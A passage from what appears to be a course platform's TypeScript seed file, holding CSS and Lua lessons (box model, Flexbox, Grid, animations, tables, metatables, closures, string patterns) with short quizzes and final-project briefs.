        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Given equal specificity, which rule wins when two CSS rules conflict?',
          options: ['The shorter one', 'The one written first', 'The one written last', 'Whichever uses a class'],
          answer: 'The one written last',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'An ID selector (#logo) has higher specificity than a class selector (.logo).',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'A selector that targets every element with class="card" is written as ____card.',
          options: [],
          answer: '.',
        },
      ],
    },
  },
  {
    title: 'The Box Model',
    content: lessonContent(
      'The Box Model',
      `Every element on a page is rendered as a rectangular box, and every box is built from the same four layers, from the inside out.\n\n\`\`\`css\n.card {\n  width: 300px;\n  padding: 16px;      /* space between content and border */\n  border: 2px solid #333; /* the border itself */\n  margin: 24px;       /* space outside the border, between this box and others */\n}\n\`\`\`\n\n| Layer | What it does |\n|---|---|\n| Content | The actual text/images, sized by \`width\`/\`height\`. |\n| Padding | Transparent space inside the border, pushes content inward. |\n| Border | A visible (or invisible) line around the padding. |\n| Margin | Transparent space outside the border, pushes other elements away. |\n\n## box-sizing\n\nBy default, \`width\` only sets the *content* width, padding and border are added on top, so a \`300px\`-wide box with \`16px\` padding and a \`2px\` border actually takes up \`336px\`. Most developers override this globally:\n\n\`\`\`css\n*, *::before, *::after {\n  box-sizing: border-box;\n}\n\`\`\`\n\nWith \`border-box\`, \`width: 300px\` means the *whole box*, content, padding, and border, is 300px total, which is far more predictable when building layouts.\n\n## display: block vs. inline\n\n- **Block** elements (\`<div>\`, \`<p>\`, \`<h1>\`) take the full available width and stack vertically; \`width\`/\`height\`/\`margin\` all apply normally.\n- **Inline** elements (\`<span>\`, \`<a>\`) only take up as much width as their content and sit in the flow of text; vertical \`margin\`/\`height\` are ignored.\n- \`display: inline-block\` gives you the best of both, flows like text but respects \`width\`/\`height\`/\`margin\`.\n\n> [!TIP]\n> When a layout looks subtly "off" by a few pixels, the box model is the first thing to check, open devtools and look at the computed padding, border, and margin for the element in question.`
    ),
    quiz: {
      title: 'Box Model Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which box-model layer sits directly outside the border?',
          options: ['Content', 'Padding', 'Margin', 'Outline'],
          answer: 'Margin',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'With box-sizing: border-box, the width property includes padding and border.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The CSS property that adds transparent space between an element\'s content and its border is ____.',
          options: [],
          answer: 'padding',
        },
      ],
    },
  },
  {
    title: 'Flexbox: One-Dimensional Layouts',
    content: lessonContent(
      'Flexbox: One-Dimensional Layouts',
      `Flexbox arranges items along a single line, row or column, and is the workhorse for navbars, toolbars, cards, and centering content.\n\n\`\`\`css\n.nav {\n  display: flex;\n  flex-direction: row;      /* default: left to right */\n  justify-content: space-between; /* spacing along the main axis */\n  align-items: center;      /* alignment along the cross axis */\n  gap: 16px;\n}\n\`\`\`\n\n\`\`\`html\n<div class="nav">\n  <span>Logo</span>\n  <a href="/courses">Courses</a>\n  <a href="/login">Login</a>\n</div>\n\`\`\`\n\n## The two axes\n\nFlexbox thinks in terms of a **main axis** (the direction set by \`flex-direction\`) and a **cross axis** (perpendicular to it).\n\n| Property | Controls | Common values |\n|---|---|---|\n| \`justify-content\` | Spacing along the main axis | \`flex-start\`, \`center\`, \`space-between\`, \`space-around\` |\n| \`align-items\` | Alignment along the cross axis | \`flex-start\`, \`center\`, \`stretch\` |\n| \`flex-wrap\` | Whether items wrap to new lines | \`nowrap\` (default), \`wrap\` |\n| \`gap\` | Space between items | any length, e.g. \`16px\` |\n\n## Sizing individual items\n\n\`\`\`css\n.sidebar { flex: 0 0 250px; } /* never grow, never shrink, fixed 250px */\n.content { flex: 1; }         /* grow to fill remaining space */\n\`\`\`\n\n\`flex: grow shrink basis\` controls how a specific child behaves inside the flex container, \`flex: 1\` is shorthand for "take an equal share of whatever space is left".\n\n> [!TIP]\n> Centering something perfectly, both horizontally and vertically, used to be a running joke in CSS. With Flexbox it's three lines: \`display: flex; justify-content: center; align-items: center;\`.`
    ),
    quiz: {
      title: 'Flexbox Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which property controls spacing of flex items along the main axis?',
          options: ['align-items', 'justify-content', 'flex-wrap', 'gap'],
          answer: 'justify-content',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'By default, flex items will wrap onto new lines when they run out of horizontal space.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'To turn any element into a flex container, you set display: ____.',
          options: [],
          answer: 'flex',
        },
      ],
    },
  },
  {
    title: 'CSS Grid: Two-Dimensional Layouts',
    content: lessonContent(
      'CSS Grid: Two-Dimensional Layouts',
      `Where Flexbox handles a single row or column, Grid handles rows *and* columns together, ideal for full page layouts and card galleries.\n\n\`\`\`css\n.page {\n  display: grid;\n  grid-template-columns: 200px 1fr;\n  grid-template-rows: auto 1fr auto;\n  gap: 16px;\n  min-height: 100vh;\n}\n\`\`\`\n\n\`\`\`html\n<div class="page">\n  <header style="grid-column: 1 / -1;">Header</header>\n  <nav>Sidebar</nav>\n  <main>Content</main>\n  <footer style="grid-column: 1 / -1;">Footer</footer>\n</div>\n\`\`\`\n\n## Defining tracks\n\n- \`grid-template-columns: 200px 1fr\` creates two columns: a fixed 200px sidebar and a flexible column that takes the rest (\`1fr\` = "one fraction of the remaining space").\n- \`repeat()\` avoids repetition: \`grid-template-columns: repeat(3, 1fr)\` creates three equal columns.\n- \`grid-column: 1 / -1\` makes an element span from the first line to the very last, a common trick for a full-width header or footer in a grid.\n\n## A responsive card gallery in one line\n\n\`\`\`css\n.gallery {\n  display: grid;\n  grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));\n  gap: 16px;\n}\n\`\`\`\n\nThis creates as many 200px-minimum columns as fit the container, and stretches them evenly to fill any leftover space, all without a single media query.\n\n> [!TIP]\n> A common rule of thumb: reach for Flexbox when you're arranging items in one direction (a toolbar, a list of tags), reach for Grid when you're arranging a whole page or a two-dimensional layout (rows *and* columns together).`
    ),
    quiz: {
      title: 'CSS Grid Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does the "1fr" unit represent in a grid track definition?',
          options: [
            'Exactly 1 pixel',
            'One fraction of the remaining available space',
            'A fixed percentage of the viewport',
            'One row of text',
          ],
          answer: 'One fraction of the remaining available space',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'CSS Grid can only control columns, not rows.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The property used to turn an element into a grid container is display: ____.',
          options: [],
          answer: 'grid',
        },
      ],
    },
  },
  {
    title: 'Responsive Design, Transitions, and Animations',
    content: lessonContent(
      'Responsive Design, Transitions, and Animations',
      `## Media queries\n\nA **media query** applies CSS only when certain conditions are true, most often, viewport width, letting one stylesheet adapt to phones, tablets, and desktops.\n\n\`\`\`css\n.gallery {\n  grid-template-columns: 1fr; /* single column by default (mobile) */\n}\n\n@media (min-width: 768px) {\n  .gallery {\n    grid-template-columns: repeat(3, 1fr); /* three columns on wider screens */\n  }\n}\n\`\`\`\n\n> [!TIP]\n> Writing your base styles for mobile first, then adding \`min-width\` media queries for larger screens, tends to produce simpler CSS than starting from desktop and fighting your way down.\n\n## Transitions\n\nA **transition** smoothly animates a property change over time instead of snapping instantly.\n\n\`\`\`css\n.button {\n  background: #2563eb;\n  transition: background 0.2s ease, transform 0.2s ease;\n}\n.button:hover {\n  background: #1d4ed8;\n  transform: translateY(-2px);\n}\n\`\`\`\n\n\`transition: property duration easing\` says *which* property to animate, *how long* it takes, and *how* it accelerates.\n\n## Keyframe animations\n\nFor anything more complex than a two-state hover effect, use \`@keyframes\`:\n\n\`\`\`css\n@keyframes pulse {\n  0%   { opacity: 1; }\n  50%  { opacity: 0.4; }\n  100% { opacity: 1; }\n}\n\n.loading-dot {\n  animation: pulse 1.2s ease-in-out infinite;\n}\n\`\`\`\n\n\`@keyframes\` defines named stops along the animation as percentages, then \`animation\` on the element says which keyframes to use, how long one cycle takes, and how many times to repeat (\`infinite\` for forever).\n\n> [!WARNING]\n> Animating \`width\`, \`height\`, \`top\`, or \`left\` forces the browser to recompute layout on every frame and can look janky. Prefer animating \`transform\` and \`opacity\`, which the browser can run on the GPU without recalculating layout at all.`
    ),
    quiz: {
      title: 'Responsive & Animation Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which two CSS properties are cheapest to animate because they skip layout recalculation?',
          options: ['width and height', 'top and left', 'transform and opacity', 'margin and padding'],
          answer: 'transform and opacity',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'A "mobile first" approach means writing base styles for small screens, then overriding with min-width media queries for larger ones.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The CSS at-rule used to define named animation steps is @____.',
          options: [],
          answer: 'keyframes',
        },
      ],
    },
  },
  {
    title: 'Final Project: Style a Responsive Landing Page',
    content: lessonContent(
      'Final Project: Style a Responsive Landing Page',
      `Take a plain HTML page (your own, or a simple one you write for this project) and turn it into a polished, responsive landing page.\n\n## Requirements\n\n1. Set \`box-sizing: border-box\` globally and use a consistent spacing scale (e.g. multiples of 8px) for padding and margin.\n2. Build the page's navigation bar with Flexbox (logo on one side, links on the other).\n3. Build at least one section, like a feature list or pricing cards, using CSS Grid with \`repeat()\` and \`minmax()\` so it reflows automatically.\n4. Add at least one \`@media\` breakpoint that meaningfully changes the layout between mobile and desktop (e.g. stacked cards become a 3-column grid).\n5. Add at least one \`transition\` (e.g. on button hover) and one \`@keyframes\` animation somewhere on the page.\n\n## Stretch goals\n\n- Add a dark mode using the \`prefers-color-scheme\` media query.\n- Use CSS custom properties (\`--brand-color: #2563eb;\`) for your color palette so the whole page can be re-themed by changing a handful of variables.\n- Run the page through Lighthouse in Chrome DevTools and address any layout-related warnings.\n\nSubmit a link to your finished page (a repo, CodePen, or hosted URL) below, an instructor will review it before you can mark this lesson complete. Good luck! 🚀`
    ),
    requiresSubmission: true,
  },
];

const luaLessons: SeedLesson[] = [
  {
    title: 'Why Lua? Getting Started',
    content: lessonContent(
      'Why Lua? Getting Started',
      `Lua is a small, fast, embeddable scripting language. You'll rarely run a "Lua application" on its own, instead, Lua gets embedded inside something bigger: game engines (Roblox, Love2D, World of Warcraft addons), Neovim configuration, and even network appliances.\n\n## Why it's popular for embedding\n\n- **Tiny and fast**, the reference interpreter is a few hundred KB and famously quick for a dynamic language.\n- **Simple to embed**, a C program can create a Lua interpreter, hand it data, and call Lua functions in only a few lines.\n- **Small core language**, few keywords, one data structure (the table) that does almost everything.\n\n## Your first script\n\n\`\`\`lua\nprint("Hello from Lua!")\n\nlocal name = "Kodstigen"\nprint("Welcome to " .. name)\n\`\`\`\n\nRun it with:\n\n\`\`\`bash\nlua hello.lua\n\`\`\`\n\n- \`print\` writes a line to standard output.\n- \`local\` declares a variable scoped to the current block, without it, a variable is **global** by default, almost always a mistake.\n- \`..\` is the string concatenation operator (Lua does not overload \`+\` for strings the way JavaScript does).\n\n> [!NOTE]\n> Lua array/table indices start at **1**, not 0. This trips up almost everyone coming from C-family languages, and it's worth committing to memory right now.`
    ),
    quiz: {
      title: 'Lua Basics Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which operator concatenates two strings in Lua?',
          options: ['+', '&', '..', '.'],
          answer: '..',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Lua table and array indices start at 1 by convention, not 0.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Declaring a variable with the ____ keyword scopes it to the current block instead of making it global.',
          options: [],
          answer: 'local',
        },
      ],
    },
  },
  {
    title: 'Variables, Types, and Control Flow',
    content: lessonContent(
      'Variables, Types, and Control Flow',
      `Lua is dynamically typed, a variable's type is decided by whatever value it currently holds, and can change at runtime.\n\n## Basic types\n\n\`\`\`lua\nlocal xp = 100          -- number (Lua has no separate int/float, just "number")\nlocal name = "Ada"       -- string\nlocal passed = true      -- boolean\nlocal nothing = nil      -- absence of a value\nlocal scores = {90, 85, 100} -- table (used for arrays, maps, and objects)\n\nprint(type(xp), type(name), type(passed), type(nothing), type(scores))\n\`\`\`\n\n\`nil\` is Lua's "no value", it's what an undeclared variable holds, and it's the only value besides \`false\` that counts as falsy in a condition.\n\n## Control flow\n\n\`\`\`lua\nlocal xp = 45\n\nif xp >= 50 then\n  print("Level up!")\nelseif xp >= 25 then\n  print("Halfway there.")\nelse\n  print("Keep going.")\nend\n\nfor i = 1, 5 do\n  print("Lesson " .. i)\nend\n\nlocal count = 0\nwhile count < 3 do\n  print("count = " .. count)\n  count = count + 1\nend\n\`\`\`\n\n- Every block (\`if\`, \`for\`, \`while\`, functions) is closed with the keyword \`end\`, there are no curly braces in Lua.\n- \`for i = 1, 5 do ... end\` is a **numeric for loop**: start, stop, and an optional step (\`for i = 10, 1, -1\` counts down).\n- Only \`nil\` and \`false\` are falsy, everything else, including \`0\` and \`""\`, is truthy. This is a common gotcha for people coming from JavaScript or Python.\n\n> [!WARNING]\n> Unlike most C-family languages, \`0\` is **truthy** in Lua. \`if 0 then print("yes") end\` prints "yes". Only \`nil\` and \`false\` are falsy.`
    ),
    quiz: {
      title: 'Types & Control Flow Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which two values are considered "falsy" in a Lua condition?',
          options: ['nil and false', '0 and ""', 'nil and 0', 'false and 0'],
          answer: 'nil and false',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Lua uses curly braces { } to open and close if/for/while blocks.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Every Lua block (if, for, while, function) must be closed with the keyword ____.',
          options: [],
          answer: 'end',
        },
      ],
    },
  },
  {
    title: "Tables: Lua's Only Data Structure",
    content: lessonContent(
      "Tables: Lua's Only Data Structure",
      `Lua has exactly one built-in data structure, the **table**, and it does the job of arrays, dictionaries/maps, and even objects in other languages.\n\n## Tables as arrays\n\n\`\`\`lua\nlocal scores = {90, 85, 100}\n\nprint(scores[1])       -- 90, indices start at 1\nprint(#scores)          -- 3, the length operator\n\ntable.insert(scores, 75)  -- appends to the end\ntable.remove(scores, 1)   -- removes the first element, shifts the rest down\n\nfor i, score in ipairs(scores) do\n  print(i, score)\n end\n\`\`\`\n\n\`ipairs\` iterates a table in order from index 1 until the first \`nil\`, exactly what you want for array-like tables.\n\n## Tables as maps/objects\n\n\`\`\`lua\nlocal player = {\n  name = "Ada",\n  xp = 250,\n  ["favorite color"] = "blue", -- keys with spaces need bracket syntax\n}\n\nprint(player.name)               -- dot syntax, sugar for player["name"]\nprint(player["favorite color"])  -- bracket syntax, required for non-identifier keys\n\nplayer.level = 3 -- adding a new key is just an assignment\n\nfor key, value in pairs(player) do\n  print(key, value)\nend\n\`\`\`\n\n\`pairs\` iterates every key in a table, in an unspecified order, use it for map-style tables where order doesn't matter. \`player.name\` and \`player["name"]\` always refer to the exact same table entry, dot syntax is purely a convenience for string keys that are valid identifiers.\n\n> [!TIP]\n> Because arrays, maps, and objects are all "just a table" in Lua, a single table can even mix both styles: numeric indices for a list part and named keys for extra fields on the same object.`
    ),
    quiz: {
      title: 'Tables Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which built-in function iterates an array-like table in order from index 1?',
          options: ['pairs', 'ipairs', 'next', 'table.iter'],
          answer: 'ipairs',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'player.name and player["name"] refer to the same table entry.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The # operator in front of a table, like #scores, returns the table\'s ____.',
          options: [],
          answer: 'length',
        },
      ],
    },
  },
  {
    title: 'Functions and Scope',
    content: lessonContent(
      'Functions and Scope',
      `Functions in Lua are values, they can be stored in variables, passed as arguments, and returned from other functions, just like tables or numbers.\n\n## Defining and calling functions\n\n\`\`\`lua\nlocal function add(a, b)\n  return a + b\nend\n\nprint(add(2, 3)) -- 5\n\n-- Multiple return values\nlocal function minMax(numbers)\n  local lo, hi = numbers[1], numbers[1]\n  for _, n in ipairs(numbers) do\n    if n < lo then lo = n end\n    if n > hi then hi = n end\n  end\n  return lo, hi\nend\n\nlocal lowest, highest = minMax({4, 1, 9, 2})\nprint(lowest, highest) -- 1  9\n\`\`\`\n\nLua functions can return **multiple values** at once, something many other languages need a tuple or object to fake.\n\n## Scope with local vs. global\n\n\`\`\`lua\nxp = 100        -- global! visible everywhere, including other files\n\nlocal function levelUp()\n  local bonus = 10 -- local: only visible inside this function\n  xp = xp + bonus\nend\n\nlevelUp()\nprint(xp) -- 110\nprint(bonus) -- nil, bonus does not exist outside levelUp\n\`\`\`\n\n> [!WARNING]\n> Forgetting \`local\` silently creates a **global** variable, visible to your entire program (and, if you're embedded in a game or app, potentially to other scripts too). Get in the habit of typing \`local\` in front of every variable and function unless you deliberately want it global.\n\n## Functions as arguments\n\n\`\`\`lua\nlocal function forEach(list, callback)\n  for _, item in ipairs(list) do\n    callback(item)\n  end\nend\n\nforEach({"a", "b", "c"}, function(item)\n  print("Item: " .. item)\nend)\n\`\`\`\n\nPassing an anonymous \`function(...) ... end\` directly as an argument is idiomatic Lua, this is exactly how callback-style APIs (like button click handlers in game engines) are typically used.`
    ),
    quiz: {
      title: 'Functions & Scope Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What happens if you assign to a variable without the "local" keyword inside a function?',
          options: [
            'It causes a syntax error',
            'It creates a global variable',
            'It is scoped to that function only',
            'Lua infers whether it should be local automatically',
          ],
          answer: 'It creates a global variable',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'A Lua function can return more than one value at a time.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The keyword used to define a function in Lua is ____.',
          options: [],
          answer: 'function',
        },
      ],
    },
  },
  {
    title: 'Metatables and Modules',
    content: lessonContent(
      'Metatables and Modules',
      `## Metatables: customizing table behavior\n\nA **metatable** is a table attached to another table that defines how it behaves for operations it doesn't natively support, like addition, or missing-key lookups. This is how Lua achieves "object-oriented programming" without a built-in \`class\` keyword.\n\n\`\`\`lua\nlocal Vector = {}\nVector.__index = Vector -- missing keys on an instance fall back to Vector\n\nfunction Vector.new(x, y)\n  local self = setmetatable({}, Vector)\n  self.x = x\n  self.y = y\n  return self\nend\n\nfunction Vector:length()\n  return math.sqrt(self.x ^ 2 + self.y ^ 2)\nend\n\nlocal v = Vector.new(3, 4)\nprint(v:length()) -- 5.0\n\`\`\`\n\n- \`setmetatable(t, mt)\` attaches metatable \`mt\` to table \`t\`.\n- \`__index\` is a special metamethod: when you look up a key that \`v\` doesn't have directly (like \`length\`), Lua checks \`__index\` next, this is how "instances" share methods defined on a common table.\n- \`function Vector:length()\` is sugar for \`function Vector.length(self)\`, the colon automatically adds a hidden \`self\` first parameter, and \`v:length()\` automatically passes \`v\` as that \`self\`.\n\n## Modules\n\nLua organizes reusable code into modules: files that return a table of functions. In a real project this would be two separate files:\n\n\`\`\`\n-- mathutils.lua\nlocal M = {}\n\nfunction M.double(n)\n  return n * 2\nend\n\nreturn M\n\`\`\`\n\n\`\`\`\n-- main.lua\nlocal mathutils = require("mathutils")\nprint(mathutils.double(21)) -- 42\n\`\`\`\n\n\`require\` loads a module by name, runs it once, and caches its returned value, calling \`require\` again for the same module returns the cached table instead of re-running the file. This course's sandbox only runs one file at a time, so here's the same idea inlined into a single runnable script:\n\n\`\`\`lua\nlocal function newMathUtils() -- stands in for a separate mathutils.lua file\n  local M = {}\n\n  function M.double(n)\n    return n * 2\n  end\n\n  return M\nend\n\nlocal mathutils = newMathUtils() -- in a real project: require("mathutils")\nprint(mathutils.double(21)) -- 42\n\`\`\`\n\n> [!TIP]\n> If you've used JavaScript's ES modules or Python's imports, \`require\` will feel familiar, the key difference is that a Lua module file explicitly \`return\`s the table of things it wants to expose, instead of using an \`export\` keyword.`
    ),
    quiz: {
      title: 'Metatables & Modules Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which metamethod lets a table fall back to another table when a key is missing?',
          options: ['__missing', '__index', '__default', '__fallback'],
          answer: '__index',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Calling require("mathutils") twice runs the mathutils.lua file twice.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The function used to attach a metatable to a table is ____(t, mt).',
          options: [],
          answer: 'setmetatable',
        },
      ],
    },
  },
  {
    title: 'Final Project: Build a Text Adventure Game in Lua',
    content: lessonContent(
      'Final Project: Build a Text Adventure Game in Lua',
      `Put tables, functions, and control flow together into a small, playable text adventure.\n\n## Requirements\n\n1. Model at least three rooms as a table of tables, each with a description and a table of exits (e.g. \`{ north = "cave", south = "forest" }\`).\n2. Track the player's current room and inventory (a table used as a list) in local state.\n3. Write a main loop that prints the current room's description, reads a command from the player, and reacts to at least: moving through an exit, picking up an item, and checking inventory.\n4. Use functions to organize the logic, at minimum, a function to describe the current room and a function to handle a single command.\n5. Add a win condition, e.g. reaching a specific room, or collecting a specific item, that ends the loop with a victory message.\n\n## Stretch goals\n\n- Use a metatable so every room and item shares common behavior (like a generic \`:describe()\` method).\n- Split your rooms/items data into a separate module file and \`require\` it from your main script.\n- Add simple combat or a puzzle that requires an item from one room to progress past another.\n\nSubmit a link to your finished script (a repo or gist) below, an instructor will review it before you can mark this lesson complete. Good luck! 🚀`
    ),
    requiresSubmission: true,
  },
];

const luaIntermediateLessons: SeedLesson[] = [
  {
    title: 'Closures and Upvalues',
    content: lessonContent(
      'Closures and Upvalues',
      `Lua functions can reference variables from an enclosing scope even after that scope has returned, this is a **closure**. The captured variable is called an **upvalue**.\n\n## A closure example\n\n\`\`\`lua\nlocal function makeCounter()\n  local count = 0\n  return function()\n    count = count + 1\n    return count\n  end\nend\n\nlocal counter1 = makeCounter()\nlocal counter2 = makeCounter()\n\nprint(counter1()) -- 1\nprint(counter1()) -- 2\nprint(counter2()) -- 1, a separate count upvalue from counter1's\n\`\`\`\n\nEach call to \`makeCounter\` creates a **fresh** \`count\` variable, the inner function closes over that specific instance, not a shared global. \`counter1\` and \`counter2\` don't interfere with each other.\n\n## Why this matters\n\nClosures are how you build private state without a class: \`count\` isn't reachable from outside the returned function, there's no way to read or reset it except by calling \`counter1()\` again. This pattern shows up constantly, for example a memoized/cached computation.\n\n\`\`\`lua\nlocal function memoize(fn)\n  local cache = {}\n  return function(n)\n    if cache[n] == nil then\n      cache[n] = fn(n)\n    end\n    return cache[n]\n  end\nend\n\nlocal slowSquare = function(n) return n * n end\nlocal fastSquare = memoize(slowSquare)\n\nprint(fastSquare(5)) -- computes and caches\nprint(fastSquare(5)) -- returns the cached value\n\`\`\`\n\n> [!NOTE]\n> An upvalue is shared by reference, not copied. If two closures created in the *same* call to \`makeCounter\` both capture the same \`count\`, calling one will affect what the other sees. Each *separate call* to \`makeCounter\`, though, creates a brand-new \`count\`.`
    ),
    quiz: {
      title: 'Closures Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What is the name for a variable an inner function captures from its enclosing scope?',
          options: ['A global', 'An upvalue', 'A metatable', 'A vararg'],
          answer: 'An upvalue',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Two separate calls to the same closure-returning function share the exact same captured variable.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'A function that captures variables from its enclosing scope is called a ____.',
          options: [],
          answer: 'closure',
        },
      ],
    },
  },
  {
    title: 'Object-Oriented Lua: Classes and Inheritance',
    content: lessonContent(
      'Object-Oriented Lua: Classes and Inheritance',
      `The Fundamentals course showed how \`setmetatable\` and \`__index\` turn a plain table into something like an instance. Here we build a full **class hierarchy** with inheritance.\n\n## A base class\n\n\`\`\`lua\nlocal Animal = {}\nAnimal.__index = Animal\n\nfunction Animal.new(name)\n  return setmetatable({ name = name }, Animal)\nend\n\nfunction Animal:speak()\n  return self.name .. " makes a sound."\nend\n\`\`\`\n\n## Inheriting from it\n\n\`\`\`lua\nlocal Dog = setmetatable({}, { __index = Animal }) -- Dog falls back to Animal\nDog.__index = Dog\n\nfunction Dog.new(name)\n  local self = Animal.new(name)   -- reuse the base constructor\n  return setmetatable(self, Dog)   -- but tag the instance as a Dog\nend\n\nfunction Dog:speak() -- overrides Animal:speak\n  return self.name .. " says woof!"\nend\n\nlocal generic = Animal.new("Creature")\nlocal rex = Dog.new("Rex")\n\nprint(generic:speak()) -- Creature makes a sound.\nprint(rex:speak())      -- Rex says woof!\n\`\`\`\n\nTwo \`__index\` links are at work: \`Dog\`'s metatable points \`__index\` at \`Animal\`, so a \`Dog\` instance whose class table (\`Dog\`) doesn't have a method falls through to \`Animal\`. Because \`Dog:speak\` *is* defined, it wins over \`Animal:speak\`, this is how overriding works.\n\n## Calling the parent's method\n\n\`\`\`lua\nfunction Dog:speak()\n  return Animal.speak(self) .. " (a very good boy)"\nend\n\`\`\`\n\nCalling \`Animal.speak(self)\` directly (dot syntax, explicit \`self\`) is how Lua does "super.method()" calls, there's no dedicated \`super\` keyword.\n\n> [!TIP]\n> This two-metatable pattern (class table linked to a parent class table, instances linked to their class table) is the idiomatic way OOP frameworks implement inheritance under the hood, now you know exactly what they're doing for you.`
    ),
    quiz: {
      title: 'OOP & Inheritance Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: "To call a parent class's overridden method from a subclass, you...",
          options: [
            'Use the super keyword',
            'Call ParentClass.method(self, ...) directly',
            'Lua does this automatically',
            'It is not possible',
          ],
          answer: 'Call ParentClass.method(self, ...) directly',
        },
        {
          type: 'TRUE_FALSE',
          prompt: "Overriding Animal:speak with Dog:speak means Dog instances no longer have access to Animal's version unless explicitly called.",
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: "The metamethod that makes a missing method lookup fall back to another table is ____.",
          options: [],
          answer: '__index',
        },
      ],
    },
  },
  {
    title: 'String Patterns Deep Dive',
    content: lessonContent(
      'String Patterns Deep Dive',
      `Lua doesn't have full regular expressions, instead it has a lighter-weight **pattern** system built into \`string.find\`, \`string.match\`, \`string.gmatch\`, and \`string.gsub\`. Patterns cover the vast majority of real-world text processing without needing a heavyweight regex engine.\n\n## Character classes\n\n| Class | Matches |\n|---|---|\n| \`%a\` | a letter |\n| \`%d\` | a digit |\n| \`%s\` | whitespace |\n| \`%w\` | a letter or digit |\n| \`%p\` | punctuation |\n| \`.\`  | any character |\n\nUppercase versions (\`%A\`, \`%D\`, ...) match the *complement*. Quantifiers \`*\`, \`+\`, \`-\`, and \`?\` work similarly to regex, though \`-\` is a **lazy** (shortest) repeat, unlike \`*\`'s greedy repeat.\n\n## Capturing groups\n\n\`\`\`lua\nlocal date = "2026-07-06"\nlocal year, month, day = date:match("(%d+)-(%d+)-(%d+)")\nprint(year, month, day) -- 2026  07  06\n\`\`\`\n\nParentheses in a pattern create a **capture**, \`string.match\` returns one value per capture (or the whole match if there are none).\n\n## Iterating all matches with gmatch\n\n\`\`\`lua\nlocal text = "cat, dog, bird"\nfor word in text:gmatch("%a+") do\n  print(word)\nend\n-- cat\n-- dog\n-- bird\n\`\`\`\n\n## Search-and-replace with gsub\n\n\`\`\`lua\nlocal sentence = "Lua is great, Lua is fast"\nlocal replaced, count = sentence:gsub("Lua", "Kodstigen")\nprint(replaced) -- Kodstigen is great, Kodstigen is fast\nprint(count)    -- 2\n\n-- gsub can also take a function to compute each replacement\nlocal upper = sentence:gsub("%a+", function(word) return word:upper() end)\nprint(upper) -- LUA IS GREAT, LUA IS FAST\n\`\`\`\n\n\`gsub\` returns **two** values: the new string, and how many replacements were made, don't forget the second one if you only want the string.\n\n> [!WARNING]\n> Lua patterns are not regular expressions, features like alternation (\`a|b\`), non-capturing groups, and lookahead don't exist. For genuinely complex text processing, projects typically reach for a dedicated regex library instead of stretching patterns past what they're good at.`
    ),
    quiz: {
      title: 'String Patterns Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which character class matches a single digit in a Lua pattern?',
          options: ['%a', '%d', '%s', '%w'],
          answer: '%d',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'string.gsub returns only the new string, never a replacement count.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Parentheses in a Lua pattern create a ____, which string.match returns as a separate value.',
          options: [],
          answer: 'capture',
        },
      ],
    },
  },
  {
    title: 'Error Handling: pcall, xpcall, and error',
    content: lessonContent(
      'Error Handling: pcall, xpcall, and error',
